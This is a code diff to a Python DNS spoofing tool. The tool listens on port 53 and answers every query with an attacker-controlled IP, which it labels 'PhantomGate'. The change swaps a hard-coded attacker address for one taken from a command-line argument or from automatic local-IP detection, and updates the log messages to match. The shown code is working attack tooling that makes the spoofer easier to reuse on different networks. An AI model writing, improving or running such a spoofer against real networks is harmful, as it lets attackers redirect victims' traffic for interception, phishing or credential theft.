@@ -9,8 +9,23 @@ import socket
 import threading
 import sys
 
-ATTACKER_IP = bytes([172, 31, 142, 204])
 LISTEN_PORT = 53
+
+def get_local_ip():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "127.0.0.1"
+
+def parse_ip(ip_str):
+    return bytes(int(x) for x in ip_str.split("."))
+
+ATTACKER_IP_STR = sys.argv[1] if len(sys.argv) > 1 else get_local_ip()
+ATTACKER_IP = parse_ip(ATTACKER_IP_STR)
 
 def build_response(data):
     try:
@@ -58,7 +73,7 @@ def handle(data, addr, sock):
         reply = build_response(data)
         if reply:
             sock.sendto(reply, addr)
-            print(f"[DNS SPOOF] {addr[0]} asked for '{domain}' -> 172.31.142.204")
+            print(f"[DNS SPOOF] {addr[0]} asked for '{domain}' -> {ATTACKER_IP_STR}")
     except Exception as e:
         print(f"[ERROR] {e}")
 
@@ -75,7 +90,7 @@ def main():
         sys.exit(1)
 
     print(f"[DNS SPOOFER] Listening on 0.0.0.0:{LISTEN_PORT}")
-    print(f"[DNS SPOOFER] All queries -> 172.31.142.204 (PhantomGate)")
+    print(f"[DNS SPOOFER] All queries -> {ATTACKER_IP_STR} (PhantomGate)")
     print(f"[DNS SPOOFER] Press Ctrl+C to stop\n")
 
     while True:
